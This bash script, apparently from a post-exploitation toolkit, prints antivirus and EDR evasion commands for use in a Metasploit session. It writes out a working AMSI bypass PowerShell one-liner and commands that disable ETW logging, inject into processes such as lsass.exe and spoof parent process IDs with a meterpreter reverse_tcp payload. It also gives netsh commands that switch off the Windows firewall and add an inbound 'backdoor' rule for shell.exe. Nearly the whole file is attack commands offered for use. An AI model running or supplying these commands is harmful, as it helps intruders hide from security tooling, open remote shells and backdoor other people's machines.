#!/usr/bin/env bash
# ==============================================================================
# EDR BYPASS — Anti-virus and EDR evasion techniques
# Usage: bash edr_bypass.sh <SESSION_ID>
# ==============================================================================
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../../lib/common.sh" 2>/dev/null || true
source "$SCRIPT_DIR/../../../lib/env.sh" 2>/dev/null || true
SESSION="${1:-}"
IN_MSF=false; [[ "${MSF_CONSOLE:-}" == "1" ]] || [[ -n "${MSFCONSOLE_BIN:-}" ]] && IN_MSF=true
run_msf() { local m="$1"; shift; local c="use $m"; for a in "$@"; do c="$c; set $a"; done; c="$c; run"; echo "$c"; }
echo ""; echo "=== EDR BYPASS ==="; [[ -n "$SESSION" ]] && echo "Session: $SESSION"; echo ""
echo -e "--- ${RED}Process Injection${NC} ---"
$IN_MSF && run_msf "post/windows/manage/migrate" "SESSION ${SESSION:-1}"
echo "# Manual: inject into explorer.exe, svchost.exe, lsass.exe"
echo "use post/windows/manage/process_migrate; set SESSION ${SESSION:-1}; run"
echo ""
echo -e "--- ${RED}AMSI Bypass${NC} ---"
echo "# PowerShell: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
echo "# Or: import-module ./amsi-bypass.ps1"
echo ""
echo -e "--- ${RED}ETW Bypass${NC} ---"
echo "# Disable ETW: bcdedit /set DisableETWLogging 1"
echo "# Or patch ntdll.dll in memory"
echo ""
echo -e "--- ${RED}PPID Spoofing${NC} ---"
echo "use exploit/windows/local/ppid_spoofing; set SESSION ${SESSION:-1}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>"
echo ""
echo -e "--- ${RED}Blockdlls${NC} ---"
echo "meterpreter> blockdlls  # block non-Microsoft DLLs"
echo "meterpreter> execute -f c:\\windows\\system32\\cmd.exe -a '/c whoami' -H -i -c -m -d calc.exe"
echo ""
echo -e "--- ${YELLOW}Firewall Evasion${NC} ---"
echo "execute -f cmd.exe -a '/c netsh advfirewall set allprofiles state off'"
echo "execute -f cmd.exe -a '/c netsh advfirewall firewall add rule name=\"backdoor\" dir=in action=allow program=\"C:\\temp\\shell.exe\" enable=yes'"
echo ""
echo -e "--- ${BLUE}Living off the Land${NC} ---"
echo "# Use built-in tools: certutil, bitsadmin, regsvr32, mshta, rundll32"
echo "# No binary drops - use scriptlets, DLLs, COM objects"
